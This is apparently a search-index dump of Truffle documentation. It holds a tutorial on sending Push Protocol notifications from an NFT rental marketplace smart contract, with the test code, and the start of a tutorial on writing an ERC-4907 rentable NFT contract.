tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}); // 1 day rental, pricePerDay is 1 assert . equal (( await tracker . delta ()). toString (), ether ( \"1\" ). toString (), \"One day rental fee is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID1 ); let expectedListing = { owner : TOKEN_OWNER , user : USER , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : TODAY_2 , rentalFee : 1 }; assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID1 , USER , TODAY_2 ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . rentNFT ( nftContract , tokenID2 , IN_FIVE_DAYS , { from : USER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ). toString (), \"Five day rental fee is not correct\" ); listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . expires = IN_FIVE_DAYS ; expectedListing . rentalFee = ether ( \"2.5\" ); assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID2 , USER , IN_FIVE_DAYS ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); }); it ( \"should validate rentals\" , async function () { await expectRevert ( marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}), \"NFT already rented\" ); await marketplace . listNFT ( nftContract , tokenID3 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , IN_FIVE_DAYS + 1000 , { from : USER , value : ether ( \"2.5\" )}), \"Rental period exceeds max date rentable\" ); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , TOMORROW , { from : USER }), \"Not enough ether to cover rental period\" ); }); it ( \"should validate unlisting\" , async function () { await expectRevert ( marketplace . unlistNFT ( nftContract , 10000 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}), \"This NFT is not listed\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : USER , value : ether ( \"2.5\" )}), \"Not approved to unlist NFT\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER }), \"Not enough ether to cover refund\" ); }); it ( \"should refund USER and cleanup listings if unlisted\" , async function () { let tracker = await balance . tracker ( USER ); await tracker . get (); let txn = await marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ), \"Refunded amount is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); assert . equal ( Object . keys ( listing ). length , 0 , \"NFT was not unlisted\" ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); expectEvent ( txn , \"NFTUnlisted\" , { unlistSender : TOKEN_OWNER , nftContract : nftContract , tokenId : tokenID2 . toString (), refund : ether ( \"2.5\" ) }); }); }); In order to use our forked ganache, let's specify a network in truffle-config.js . Add the following under networks: goerlidev : { network_id : \"*\" , port : 8545 , host : \"127.0.0.1\" } Then, you can run your tests as follows: truffle test --network goerlidev Try it out for real! \u00b6 Now, if you want to actually try it out on Goerli. You can run the truffle/scripts/run.js script we wrote before. You'll need to make some modifications so that we use the contracts we just deployed. Like we did for the tests, replace your NFT and Marketplace contract abstractions with: RentableNft . at ( \"NFT_GOERLI ADDRESS\" ); Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); Additionally, change the user address to whatever address you mint your NFT with. Then, run the scripts as follows: truffle exec scripts/run.js --network dashboard You'll be stepping through multiple transactions, which you can see being called in the Dashboard view. To check that notifications were sent in the unlistNFT call, you can follow Push's instructions here . Join our community \u00b6 If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Web3 Unleashed: How to Add Notifications to Your Dapp"}, {"location": "guides/push-notification/#web3-unleashed-how-to-add-notifications-to-your-dapp", "text": "Written by Emily Lin Last updated 1/05/2023", "title": "Web3 Unleashed: How to Add Notifications to Your Dapp"}, {"location": "guides/push-notification/#overview", "text": "Our full-stack NFT rental marketplace is done! We created a rentable NFT , wrote a rental marketplace smart contract , and built a frontend to tie it all together. In this guide, we'll be adding some details to improve the user experience: using Push to send decentralized notifications whenever a user's rental has expired. Additionally, we'll be using ganache forking to test our contracts and interact with the Push contracts locally before deploying to an actual testnet or mainnet. Watch the livestream on YouTube for a more in-depth walkthrough and to hear from core dev, Fabio, about how Push is changing up Web3 communication! The completed code lives here . NOTE: We are only interacting with the smart contracts, so you can ignore the client folder.", "title": "Overview"}, {"location": "guides/push-notification/#download-system-requirements", "text": "You'll need to install: Node.js , v14 or higher truffle ganache CLI", "title": "Download System Requirements"}, {"location": "guides/push-notification/#create-an-infura-account-and-project", "text": "To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft-marketplace , and select Web3 API from the dropdown.", "title": "Create an Infura account and project"}, {"location": "guides/push-notification/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/push-notification/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/push-notification/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once.", "title": "Get Some Test Eth"}, {"location": "guides/push-notification/#set-up-your-project", "text": "We'll be starting with the marketplace contracts we wrote in episode 4 . Go ahead and clone the main project here . Since we're only interacting with the smart contracts in this tutorial, we'll just go to the truffle folder and install our dependencies. cd unleashed_nft_rental_marketplace/truffle npm i", "title": "Set Up Your Project"}, {"location": "guides/push-notification/#create-a-channel-in-push", "text": "In order to send notifications, we need to create a channel for users to subscribe to. To create a channel, see the Push docs here . In this guide, we are only building on Ethereum, so ignore any instructions for multi-chain channels. Additionally, we are deploying on Goerli and NOT multi-chain, so make sure you're creating your channel through the staging dapp - NOT the prod dapp. Do note that you'll need 50 Goerli PUSH in order to deploy your channel! Their staging dapp has a link that will send some to your wallet. Note that the address of your channel is the account address you deployed with. Additionally, you can only have one channel per address.", "title": "Create a Channel in Push"}, {"location": "guides/push-notification/#create-ipushcomminterfacesol", "text": "In order to send notifications from our marketplace smart contract, we need to interact with Push's deployed contracts. First, we'll create a IPUSHCommInterface interface contract to be able to call those methods. truffle create contract IPUSHCommInterface Then, copy and paste in this code: // PUSH Comm Contract Interface interface IPUSHCommInterface { function sendNotification ( address _channel , address _recipient , bytes calldata _identity ) external ; }", "title": "Create IPUSHCommInterface.sol"}, {"location": "guides/push-notification/#call-sendnotification", "text": "Now that we have the interface contract, we can go ahead and call sendNotification on Push's deployed contract to alert our users that their rental was unlisted. We want to notify the user which NFT was unlisted in the notification message, which is of type string. However, it's not straightforward to convert the address type into a string type. Luckily, OpenZeppelin provides the Strings library to help with these types of conversions. Import it at the top of the Marketplace contract: import \"@openzeppelin/contracts/utils/Strings.sol\" ; Then, to construct the notification message, add the following code before we clean up the Marketplace data in unlistNFT . string memory body = string . concat ( \"Your NFT rental from \" , Strings . toHexString ( nftContract ), \" with tokenId \" , Strings . toString ( tokenId ), \" has expired.\" ); if ( msg . sender == listing . owner ) { string . concat ( body , \" Your rental NFT was unlisted by the owner, so you have been refunded \" , Strings . toString ( refund ), \" ETH.\" ); } Afterwards, call sendNotification afterwards: IPUSHCommInterface ( address ( 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa )). sendNotification ( address ( YOUR_CHANNEL_ADDRESS ), // from channel - recommended to set channel via dApp and put it's value -> then once contract is deployed, go back and add the contract address as delegate for your channel listing . user , // to recipient, put address(this) in case you want Broadcast or Subset. For Targetted put the address to which you want to send bytes ( string ( // We are passing identity here: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations abi . encodePacked ( \"0\" , // this is notification identity: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations \"+\" , // segregator \"3\" , // this is payload type: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/payload (1, 3 or 4) = (Broadcast, targetted or subset) \"+\" , // segregator \"Your NFT rental has expired\" , // this is notification title \"+\" , // segregator body // notification body ) ) ) ); Note that 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa is the address for the Push contract deployed on Goerli. If you're not deploying on Goerli, you can find the appropriate smart contract address for your desired chain here . You'll be using the address listed under EPNS CommV1 . The final unlistNFT function looks like this: // function to unlist your rental, refunding the user for any lost time function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } string memory body = string . concat ( \"Your NFT rental from \" , Strings . toHexString ( nftContract ), \" with tokenId \" , Strings . toString ( tokenId ), \" has expired.\" ); if ( msg . sender == listing . owner ) { string . concat ( body , \" Your rental NFT was unlisted by the owner, so you have been refunded \" , Strings . toString ( refund ), \" ETH.\" ); } IPUSHCommInterface ( address ( 0xb3971BCef2D791bc4027BbfedFb47319A4AAaaAa )). sendNotification ( address ( 0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8 ), // from channel - recommended to set channel via dApp and put it's value -> then once contract is deployed, go back and add the contract address as delegate for your channel listing . user , // to recipient, put address(this) in case you want Broadcast or Subset. For Targetted put the address to which you want to send bytes ( string ( // We are passing identity here: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations abi . encodePacked ( \"0\" , // this is notification identity: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/identity/payload-identity-implementations \"+\" , // segregator \"3\" , // this is payload type: https://docs.epns.io/developers/developer-guides/sending-notifications/advanced/notification-payload-types/payload (1, 3 or 4) = (Broadcast, targetted or subset) \"+\" , // segregator \"Your NFT rental has expired\" , // this is notification title \"+\" , // segregator body // notification body ) ) ) ); // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); }", "title": "Call sendNotification"}, {"location": "guides/push-notification/#deploy-the-marketplace-contract-and-add-it-as-a-delegate", "text": "In order for the contract address to send a notification, it needs to be set as a delegate by Push. To do so, follow the instructions here . First, we need to deploy the contract onto Goerli. We can do this with Truffle Dashboard . Connect to Goerli with MetaMask after bringing up Dashboard. truffle dashboard truffle migrate --network dashboard Then, add the deployed contract address as delegate through the staging dapp you created your channel in.", "title": "Deploy the Marketplace contract and add it as a delegate"}, {"location": "guides/push-notification/#test-notifications-locally", "text": "Because our Marketplace contract now interacts with the Push contract on Goerli, we have to run our tests against a forked version of Ganache. We can do so without any configuration, due to Infura's free archive node access. Spin it up in a different terminal: ganache --fork goerli Then, in our tests, we need to reference the specific contract addresses we just deployed on Goerli. You can do so by replacing Marketplace.deployed() and RentableNft.deployed() with the following: marketplace = await Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); rentableNft = await RentableNft . at ( \"NFT_GOERLI_ADDRESS\" ); Additionally, you'll need to replace MARKETPLACE_OWNER with the actual address you deployed your contracts with. Your final test code should look like this: require ( \"@openzeppelin/test-helpers/configure\" )({ provider : web3 . currentProvider , singletons : { abstraction : \"truffle\" , }, }); const { balance , constants , ether , expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const Marketplace = artifacts . require ( \"Marketplace\" ); const RentableNft = artifacts . require ( \"RentableNft\" ); const TODAY = Math . floor ( Date . now () / 1000 ); const TODAY_2 = TODAY + ( 60 * 60 ); const YESTERDAY = TODAY - ( 24 * 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const IN_FIVE_DAYS = TODAY + ( 24 * 60 * 60 * 5 ); function assertListing ( actual , expected ) { assert . equal ( actual . owner , expected . owner , \"Owner is not correct\" ); assert . equal ( actual . user , expected . user , \"User is not correct\" ); assert . equal ( actual . nftContract , expected . nftContract , \"NFT contract is not correct\" ); assert . equal ( actual . tokenId , expected . tokenId , \"TokenId is not correct\" ); assert . equal ( actual . pricePerDay , expected . pricePerDay , \"Price per day is not correct\" ); assert . equal ( actual . startDateUNIX , expected . startDateUNIX , \"Start date is not correct\" ); assert . equal ( actual . endDateUNIX , expected . endDateUNIX , \"End date is not correct\" ); assert . equal ( actual . expires , expected . expires , \"Expires date is not correct\" ); } async function assertNFT ( nftContractInstance , tokenId , expectedUser , expectedExpires ) { let user = await nftContractInstance . userOf . call ( tokenId ); let expires = await nftContractInstance . userExpires . call ( tokenId ); assert . equal ( user , expectedUser , \"User is not correct\" ); assert . equal ( expires , expectedExpires , \"Expires date is incorrect\" ); } // EnumerableSet makes no guarantee about ordering, so we have to find the matching tokenId function getListing ( listings , tokenId ) { let listing = {}; listings . every (( _listing ) => { if ( _listing . tokenId == tokenId ) { listing = _listing ; return false ; } else { return true ; } }); return listing } function listingToString ( listing ) { let listingCopy = {... listing }; listingCopy . tokenId = listing . tokenId . toString (); listingCopy . pricePerDay = listing . pricePerDay . toString (); listingCopy . startDateUNIX = listing . startDateUNIX . toString (); listingCopy . endDateUNIX = listing . endDateUNIX . toString (); listingCopy . expires = listing . expires . toString (); if ( \"rentalFee\" in listing ) { listingCopy . rentalFee = listing . rentalFee . toString (); } } contract ( \"Marketplace\" , function ( accounts ) { const MARKETPLACE_OWNER = \"YOUR_ACCOUNT_ADDRESS\" ; const TOKEN_OWNER = accounts [ 1 ]; const USER = accounts [ 2 ]; let marketplace ; let rentableNft ; let nftContract ; let listingFee ; let tokenID1 ; let tokenID2 ; let tokenID3 ; before ( 'should reuse variables' , async () => { marketplace = await Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); rentableNft = await RentableNft . at ( \"NFT_GOERLI_ADDRESS\" ); nftContract = rentableNft . address ; listingFee = ( await marketplace . getListingFee ()). toString (); // mint nfts for testing tokenID1 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID2 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); tokenID3 = ( await rentableNft . mint ( \"fakeURI\" , { from : TOKEN_OWNER })). logs [ 0 ]. args . tokenId . toNumber (); }); it ( \"should list nfts\" , async function () { let tracker = await balance . tracker ( MARKETPLACE_OWNER ); await tracker . get (); let txn = await marketplace . listNFT ( nftContract , tokenID1 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); let expectedListing = { owner : TOKEN_OWNER , user : constants . ZERO_ADDRESS , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : 0 }; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID1 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . listNFT ( nftContract , tokenID2 , ether ( \".5\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); assert . equal ( await tracker . delta (), listingFee , \"Listing fee not transferred\" ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . startDateUNIX = TOMORROW ; expectedListing . endDateUNIX = IN_FIVE_DAYS ; expectedListing . expires = 0 ; assertListing ( getListing ( await marketplace . getAllListings . call (), tokenID2 ), expectedListing ); expectEvent ( txn , \"NFTListed\" , listingToString ( expectedListing )); }); it ( \"should validate listings\" , async function () { await expectRevert ( marketplace . listNFT ( marketplace . address , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Contract is not an ERC4907\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : accounts [ 2 ], value : listingFee }), \"Not owner of nft\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER }), \"Not enough ether for listing fee\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 0 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Rental price should be greater than 0\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , YESTERDAY , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"Start date cannot be in the past\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , IN_FIVE_DAYS , YESTERDAY , { from : TOKEN_OWNER , value : listingFee }), \"End date cannot be before the start date\" ); await expectRevert ( marketplace . listNFT ( nftContract , tokenID1 , 1 , TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }), \"This NFT has already been listed\" ); }); it ( \"should modify listings and nft contract when nft is rented\" , async function () { assertNFT ( rentableNft , tokenID1 , constants . ZERO_ADDRESS , 0 ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); let tracker = await balance . tracker ( TOKEN_OWNER ); await tracker . get (); let txn = await marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}); // 1 day rental, pricePerDay is 1 assert . equal (( await tracker . delta ()). toString (), ether ( \"1\" ). toString (), \"One day rental fee is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID1 ); let expectedListing = { owner : TOKEN_OWNER , user : USER , nftContract : nftContract , tokenId : tokenID1 , pricePerDay : ether ( \"1\" ), startDateUNIX : TOMORROW , endDateUNIX : IN_FIVE_DAYS , expires : TODAY_2 , rentalFee : 1 }; assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID1 , USER , TODAY_2 ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); await tracker . get (); txn = await marketplace . rentNFT ( nftContract , tokenID2 , IN_FIVE_DAYS , { from : USER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ). toString (), \"Five day rental fee is not correct\" ); listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); expectedListing . tokenId = tokenID2 ; expectedListing . pricePerDay = ether ( \".5\" ); expectedListing . expires = IN_FIVE_DAYS ; expectedListing . rentalFee = ether ( \"2.5\" ); assertListing ( listing , expectedListing ); assertNFT ( rentableNft , tokenID2 , USER , IN_FIVE_DAYS ); expectEvent ( txn , \"NFTRented\" , listingToString ( expectedListing )); }); it ( \"should validate rentals\" , async function () { await expectRevert ( marketplace . rentNFT ( nftContract , tokenID1 , TODAY_2 , { from : USER , value : ether ( \"1\" )}), \"NFT already rented\" ); await marketplace . listNFT ( nftContract , tokenID3 , ether ( \"1\" ), TOMORROW , IN_FIVE_DAYS , { from : TOKEN_OWNER , value : listingFee }); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , IN_FIVE_DAYS + 1000 , { from : USER , value : ether ( \"2.5\" )}), \"Rental period exceeds max date rentable\" ); await expectRevert ( marketplace . rentNFT ( nftContract , tokenID3 , TOMORROW , { from : USER }), \"Not enough ether to cover rental period\" ); }); it ( \"should validate unlisting\" , async function () { await expectRevert ( marketplace . unlistNFT ( nftContract , 10000 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}), \"This NFT is not listed\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : USER , value : ether ( \"2.5\" )}), \"Not approved to unlist NFT\" ); await expectRevert ( marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER }), \"Not enough ether to cover refund\" ); }); it ( \"should refund USER and cleanup listings if unlisted\" , async function () { let tracker = await balance . tracker ( USER ); await tracker . get (); let txn = await marketplace . unlistNFT ( nftContract , tokenID2 , { from : TOKEN_OWNER , value : ether ( \"2.5\" )}); assert . equal (( await tracker . delta ()). toString (), ether ( \"2.5\" ), \"Refunded amount is not correct\" ); let listing = getListing ( await marketplace . getAllListings . call (), tokenID2 ); assert . equal ( Object . keys ( listing ). length , 0 , \"NFT was not unlisted\" ); assertNFT ( rentableNft , tokenID2 , constants . ZERO_ADDRESS , 0 ); expectEvent ( txn , \"NFTUnlisted\" , { unlistSender : TOKEN_OWNER , nftContract : nftContract , tokenId : tokenID2 . toString (), refund : ether ( \"2.5\" ) }); }); }); In order to use our forked ganache, let's specify a network in truffle-config.js . Add the following under networks: goerlidev : { network_id : \"*\" , port : 8545 , host : \"127.0.0.1\" } Then, you can run your tests as follows: truffle test --network goerlidev", "title": "Test notifications locally"}, {"location": "guides/push-notification/#try-it-out-for-real", "text": "Now, if you want to actually try it out on Goerli. You can run the truffle/scripts/run.js script we wrote before. You'll need to make some modifications so that we use the contracts we just deployed. Like we did for the tests, replace your NFT and Marketplace contract abstractions with: RentableNft . at ( \"NFT_GOERLI ADDRESS\" ); Marketplace . at ( \"MARKETPLACE_GOERLI_ADDRESS\" ); Additionally, change the user address to whatever address you mint your NFT with. Then, run the scripts as follows: truffle exec scripts/run.js --network dashboard You'll be stepping through multiple transactions, which you can see being called in the Dashboard view. To check that notifications were sent in the unlistNFT call, you can follow Push's instructions here .", "title": "Try it out for real!"}, {"location": "guides/push-notification/#join-our-community", "text": "If you want to talk about this content, join our Discord ! If you need help coding, start a discussion here . Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Join our community"}, {"location": "guides/rentable-nft/", "text": "Web3 Unleashed: Write a Rentable NFT Smart Contract \u00b6 Written by Emily Lin and Leandro Faria Last updated 11/15/2022 Overview \u00b6 In this guide, we'll be covering what the ERC-4907 rentable NFT standard is and how we can implement one using Truffle! Watch our livestream recording with Jesse Luong from Double Protocol , the creators of the ERC-4907 standard on YouTube for a more in-depth explanation and exploration into the standard's impact on GameFi and the metaverse! What is the ERC-4907? \u00b6 NFT renting has become a growing use case for utility based NFTs - for example, virtual land in the metaverse or in-game NFT assets. In the first episode of Web3 Unleashed, we learned that ERCs are application level standards that establish a shared interface for contracts and dapps to reliably interact with each other. In this case, ERC-4907 standardizes the way NFT rentals happen by separating the concept of user and owner . This allows us to identify permissioned roles on the NFT. That is, a user has the ability to use the NFT, but does not have the permission to sell it. In addition, an expires function is introduced, so that the user only has temporary access to use the NFT. What's in an ERC-4907? \u00b6 The interface is specified as follows: interface IERC4907 { // Logged when the user of a NFT is changed or expires is changed /// @notice Emitted when the `user` of an NFT or the `expires` of the `user` is changed /// The zero address for user indicates that there is no user address event UpdateUser ( uint256 indexed tokenId , address indexed user , uint64 expires ); /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) external ; /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) external view returns ( address ); /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) external view returns ( uint256 ); } Additionally: - The userOf(uint256 tokenId) function MAY be implemented as pure or view . - The userExpires(uint256 tokenId) function MAY be implemented as pure or view . - The setUser(uint256 tokenId, address user, uint64 expires) function MAY be implemented as public or external . - The UpdateUser event MUST be emitted when a user address is changed or the user expires is changed. - The supportsInterface method MUST return true when called with 0xad092b5c . Let's Write an ERC-4907! \u00b6 Let's get started writing a rentable NFT! You can find the completed code here . We'll be importing Open Zeppelin's contracts, which provide secure, pre-written implementations of the ERC that our contract can just inherit! Note that we will not be covering the basics of the ERC-721 standard. You can find a great Infura blog detailing what it is and how to implement it here . Download System Requirements \u00b6 You'll need to install: Node.js , v12 or higher truffle ganache UI or ganache CLI Create an Infura account and project \u00b6 To connect your DApp to Ethereum mainnet and testnets, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it rentable-nft , and select Web3 API from the dropdown Register for a MetaMask wallet \u00b6 To interact with your DApp in the browser, you'll need a MetaMask wallet. Sign up for an account here . Download VS Code \u00b6 Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here . Get Some Test Eth \u00b6 In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Paradigm has a great MultiFaucet that deposits funds across 8 different networks all at once. Set Up Your Project \u00b6 Truffle has some nifty functions to scaffold your truffle project and add example contracts and tests. We'll be building our project in a folder called rentable-nft . truffle init rentable-nft cd rentable-nft truffle create contract RentablePets truffle create contract IERC4907 truffle create contract ERC4907 truffle create test TestRentablePets Afterwards, your project structure should look something like this: rentable-nft \u251c\u2500\u2500 contracts \u2502 \u251c\u2500\u2500 ERC4907.sol \u2502 \u251c\u2500\u2500 IERC4907.sol \u2502 \u2514\u2500\u2500 RentablePets.sol \u251c\u2500\u2500 migrations \u2502 \u2514\u2500\u2500 1_deploy_contracts.js \u251c\u2500\u2500 test \u2502 \u2514\u2500\u2500 test_rentable_pets.js \u2514\u2500\u2500 truffle-config.js Write the ERC-4907 Interface \u00b6 Now, let's add the interface functions defined in the EIP . To do this, go to IERC4907.sol and change contract to interface . Then, we'll just copy and paste what was specified on the EIP! It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; interface IERC4907 { // Logged when the user of a NFT is changed or expires is changed /// @notice Emitted when the `user` of an NFT or the `expires` of the `user` is changed /// The zero address for user indicates that there is no user address event UpdateUser ( uint256 indexed tokenId , address indexed user , uint64 expires ); /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) external ; /// @notice Get the user address of an NFT /// @dev The zero address indicates that there is no user or the user is expired /// @param tokenId The NFT to get the user address for /// @return The user address for this NFT function userOf ( uint256 tokenId ) external view returns ( address ); /// @notice Get the user expires of an NFT /// @dev The zero value indicates that there is no user /// @param tokenId The NFT to get the user expires for /// @return The user expires for this NFT function userExpires ( uint256 tokenId ) external view returns ( uint256 ); } Once you've created this file you shouldn't need to touch it again. Write the ERC-4907 Smart Contract \u00b6 Now, let's write an ERC-4907 smart contract that extends OpenZeppelin's ERC-721URIStorage contract. First, install OpenZeppelin's contracts: npm i @openzeppelin/contracts@4.8.0 The basics of an ERC-721 are covered in this Infura blog . We choose to use ERC721URIStorage so that we don't have to use a static metadata file to populate the tokenURI . To do this, import the interface we created and OpenZeppelin's ERC721URIStorage implementation and have our ERC4907 smart contract inherit their properties as follows: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts/token/ERC721/ERC721URIStorage.sol\" ; import \"./IERC4907.sol\" ; contract ERC4907 is ERC721URIStorage , IERC4907 { constructor () public { } } Then, we'll modify the constructor to take in the NFT collection name and symbol when the contract is deployed. contract ERC4907 is ERC721 , IERC4907 { constructor ( string memory _name , string memory _symbol ) ERC721 ( _name , _symbol ){ } } Before we start implementing the functions defined in IERC4907 , let's set up two state variables UserInfo and _users to help define and store the concept of user . contract ERC4907 is ERC721URIStorage , IERC4907 { struct UserInfo { address user ; // address of user role uint64 expires ; // unix timestamp, user expires } mapping ( uint256 => UserInfo ) internal _users ; UserInfo stores the user's address and the rental expiration date _users maps the tokenId of the relevant NFT to the appropriate user (rentee) Finally, let's get started on implementing the interface functions! setUser \u00b6 This function can only be called by the owner of the NFT. It allows the owner to specify who will be the rentee of the NFT. The user now has the NFT in their wallet, but cannot perform any actions on it such as burn or transfer. Add this function to your ERC4907.sol file: /// @notice set the user and expires of a NFT /// @dev The zero address indicates there is no user /// Throws if `tokenId` is not valid NFT /// @param user The new user of the NFT /// @param expires UNIX timestamp, The new user could use the NFT before expires function setUser ( uint256 tokenId , address user , uint64 expires ) public virtual override { require ( _isApprovedOrOwner ( msg . sender , tokenId ), \"ERC721: transfer caller is not owner nor approved\" ); UserInfo storage info = _users [ tokenId ]; info . user = user ; info . expires = expires ; emit UpdateUser ( tokenId , user , expires ); } This function will update the UserInfo struct with the address of the rentee and the block timestamp that the renting period will expires . We use the inherited function _isApprovedOrOwner from ERC721 to indicate only the owner has the ability to decide who can user the NFT. Lastly, we will emit an UpdateUser event 